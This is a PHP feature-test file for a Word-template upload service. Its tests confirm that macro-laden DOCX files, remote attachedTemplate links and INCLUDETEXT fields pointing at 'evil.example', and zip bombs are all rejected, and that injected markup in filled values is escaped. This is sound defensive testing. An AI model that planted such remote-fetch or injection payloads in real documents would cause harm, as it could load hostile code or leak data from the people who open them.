<?php

use App\Enums\DocumentProcessingStatus;
use App\Enums\DocumentVersionKind;
use App\Models\Document;
use App\Models\Envelope;
use App\Models\Template;
use App\Models\TemplateVersion;
use App\Services\Templates\RestrictedTemplateProcessor;
use Illuminate\Support\Facades\Storage;
use Inertia\Testing\AssertableInertia as Assert;
use Tests\Feature\Documents\Support\DocumentFixtures;
use Tests\Feature\Pdf\Support\PdfFixtures;

require_once __DIR__.'/Support/TemplateHelpers.php';

beforeEach(function () {
    $this->work = templatesWorkspace();
    ['organization' => $this->organization, 'owner' => $this->owner] = createOrganizationWithOwner();
    templatesEnable($this->organization);
    actingAsMember($this->owner, $this->organization);
});

afterEach(fn () => PdfFixtures::cleanup($this->work ?? null));

function storeDocxTemplate(object $test, string $path, string $name = 'contrato.docx')
{
    return $test->post(route('templates.store'), [
        'name' => 'Contrato Word',
        'source_type' => 'docx',
        'file' => templateUpload($path, $name),
    ]);
}

describe('arquivos DOCX recusados', function () {
    test('DOCX com macro (vbaProject.bin) é recusado e nada é gravado', function () {
        $path = templateDocxFile($this->work.'/macro.docx', ['Olá ${nome}'], [
            'word/vbaProject.bin' => str_repeat('VBA', 50),
        ]);

        storeDocxTemplate($this, $path)->assertSessionHasErrors(['file' => 'O modelo DOCX contém macros, que não são aceitas. Salve o arquivo como "Documento do Word (.docx)" sem macros e envie de novo.']);

        expect(Template::query()->count())->toBe(0)
            ->and(Storage::disk('documents')->allFiles())->toBe([]);
    });

    test('DOCX habilitado para macro pelo tipo de conteúdo é recusado', function () {
        $types = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>';
        $path = templateDocxFile($this->work.'/docm.docx', ['Olá ${nome}'], [], $types);

        storeDocxTemplate($this, $path)->assertSessionHasErrors('file');
        expect(Template::query()->count())->toBe(0);
    });

    test('DOCX com modelo anexado externo (attachedTemplate remoto) é recusado', function () {
        $path = templateDocxFile($this->work.'/externo.docx', ['Olá ${nome}'], [
            'word/_rels/settings.xml.rels' => '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/modelo.dotm" TargetMode="External"/></Relationships>',
        ]);

        storeDocxTemplate($this, $path)->assertSessionHasErrors('file');
        expect(Template::query()->count())->toBe(0);
    });

    test('DOCX com campo INCLUDETEXT/DDE é recusado', function () {
        $path = $this->work.'/campo.docx';
        templateDocxFile($path, ['Olá ${nome}']);

        $zip = new ZipArchive;
        $zip->open($path);
        $zip->addFromString('word/document.xml', '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:instrText xml:space="preserve"> INCLUDETEXT "http://evil.example/x.docx" </w:instrText></w:r></w:p></w:body></w:document>');
        $zip->close();

        storeDocxTemplate($this, $path)->assertSessionHasErrors('file');
        expect(Template::query()->count())->toBe(0);
    });

    test('zip bomb é recusada pela mesma inspeção do upload de documentos', function () {
        $path = DocumentFixtures::docxZipBomb($this->work.'/bomba.docx');

        storeDocxTemplate($this, $path)->assertSessionHasErrors('file');
        expect(Template::query()->count())->toBe(0);
    });

    test('marcador malformado no arquivo é recusado com orientação', function () {
        $path = templateDocxFile($this->work.'/marcador.docx', ['Olá ${Nome Completo}']);

        storeDocxTemplate($this, $path)->assertSessionHasErrors('file');
        expect(Template::query()->count())->toBe(0);
    });

    test('PDF enviado num modelo Word é recusado', function () {
        $path = PdfFixtures::onePagePdf($this->work.'/doc.pdf');

        storeDocxTemplate($this, $path, 'doc.pdf')->assertSessionHasErrors(['file' => 'Este modelo é do tipo Word: envie um arquivo .docx.']);
    });
});

describe('DOCX aceito', function () {
    test('as variáveis do arquivo são declaradas como texto na criação', function () {
        $path = templateDocxFile($this->work.'/ok.docx', ['Locatário: ${nome_locatario}', 'CPF: ${cpf}', 'De novo: ${nome_locatario}']);

        storeDocxTemplate($this, $path)->assertSessionHasNoErrors()->assertRedirect();

        $template = Template::query()->firstOrFail();
        $version = $template->currentVersion()->with('variables')->first();

        expect($version->variables->pluck('key')->all())->toBe(['nome_locatario', 'cpf'])
            ->and($version->variables->pluck('type')->map->value->unique()->all())->toBe(['text'])
            ->and($version->settings['placeholders'])->toBe(['nome_locatario', 'cpf'])
            ->and($version->sha256)->toBe(hash_file('sha256', $path))
            ->and(Storage::disk('documents')->exists($version->storage_path))->toBeTrue()
            ->and($version->storage_path)->toStartWith('orgs/'.$this->organization->ulid.'/templates/'.$template->ulid.'/');
    });

    test('substituição em uma passada: valor com ${outra} não é reexpandido e sai escapado para XML', function () {
        $path = templateDocxFile($this->work.'/fill.docx', ['A=${campo_a}', 'B=${campo_b}']);

        $processor = new RestrictedTemplateProcessor($path);
        $processor->fill([
            'campo_a' => '${campo_b} <w:t>&"</w:t> @php echo 1 @endphp',
            'campo_b' => 'VALOR_B',
        ]);
        $output = $this->work.'/fill-out.docx';
        $processor->saveAs($output);

        $xml = templateDocxXml($output);

        expect($xml)
            ->toContain('A=${campo_b} &lt;w:t&gt;&amp;&quot;&lt;/w:t&gt; @php echo 1 @endphp')
            ->toContain('B=VALOR_B')
            ->and(substr_count($xml, 'VALOR_B'))->toBe(1);
    });

    test('sem LibreOffice o documento gerado falha de forma honesta, e o formulário avisa antes', function () {
        templatesRequirePdftool();
        config()->set('pdftool.libreoffice.binary', null);

        $path = templateDocxFile($this->work.'/ok.docx', ['Locatário: ${nome}', 'CPF: ${cpf}']);
        storeDocxTemplate($this, $path)->assertSessionHasNoErrors();

        $template = Template::query()->firstOrFail();

        $this->get(route('envelopes.create', ['template' => $template->ulid]))
            ->assertInertia(fn (Assert $page) => $page
                ->component('templates/use')
                ->where('conversion.required', true)
                ->where('conversion.available', false)
                ->where('conversion.message', fn (string $message) => str_contains($message, 'LibreOffice')));

        $roleIds = templateRoleIds($template);

        $this->post(route('templates.use', $template), [
            'values' => ['nome' => 'Ana Souza', 'cpf' => '529.982.247-25'],
            'participants' => [$roleIds['Signatário'] => ['name' => 'Ana Souza', 'email' => 'ana@example.com']],
        ])->assertSessionHasNoErrors()->assertRedirect();

        $document = Document::query()->firstOrFail();

        expect($document->processing_status)->toBe(DocumentProcessingStatus::Failed)
            ->and($document->failure_code)->toBe('converter_not_configured')
            ->and($document->failure_message)->toBe('A conversão de arquivos DOCX não está disponível nesta instalação. Converta o documento para PDF e envie novamente.');
    });

    test('com o conversor configurado (binário falso) o DOCX preenchido vira PDF, e os valores entram escapados', function () {
        templatesRequirePdftool();
        config()->set('pdftool.libreoffice.binary', PdfFixtures::fakeSoffice());
        config()->set('pdftool.libreoffice.env', ['FAKE_SOFFICE_PDF' => PdfFixtures::fakeConvertedPdf()]);

        $path = templateDocxFile($this->work.'/ok.docx', ['Locatário: ${nome}', 'CPF: ${cpf}']);
        storeDocxTemplate($this, $path)->assertSessionHasNoErrors();

        $template = Template::query()->firstOrFail();
        $this->put(route('templates.update', $template), [
            'variables' => [
                ['key' => 'nome', 'label' => 'Nome', 'type' => 'text', 'required' => true],
                ['key' => 'cpf', 'label' => 'CPF', 'type' => 'cpf', 'required' => true],
            ],
            'roles' => [['ref' => 'r1', 'name' => 'Locatário', 'participant_role' => 'signer']],
        ])->assertSessionHasNoErrors();

        $roleIds = templateRoleIds($template);

        $this->post(route('templates.use', $template), [
            'values' => ['nome' => 'Ana <b>&</b> ${cpf}', 'cpf' => '52998224725'],
            'participants' => [$roleIds['Locatário'] => ['name' => 'Ana Souza', 'email' => 'ana@example.com']],
        ])->assertSessionHasNoErrors()->assertRedirect();

        $document = Document::query()->firstOrFail();
        $original = $document->versions()->where('kind', DocumentVersionKind::Original->value)->firstOrFail();

        $local = $this->work.'/gerado.docx';
        file_put_contents($local, Storage::disk('documents')->get($original->storage_path));
        $xml = templateDocxXml($local);

        expect($document->processing_status)->toBe(DocumentProcessingStatus::Ready)
            ->and($document->versions()->where('kind', DocumentVersionKind::Converted->value)->exists())->toBeTrue()
            ->and($xml)->toContain('Locatário: Ana &lt;b&gt;&amp;&lt;/b&gt; ${cpf}')
            ->and($xml)->toContain('CPF: 529.982.247-25')
            // O DOCX do modelo continua intacto.
            ->and(hash('sha256', (string) Storage::disk('documents')->get(TemplateVersion::query()->latest('id')->first()->storage_path)))
            ->toBe(hash_file('sha256', $path));

        expect(Envelope::query()->firstOrFail()->recipients()->first()->role_label)->toBe('Locatário');
    });
});
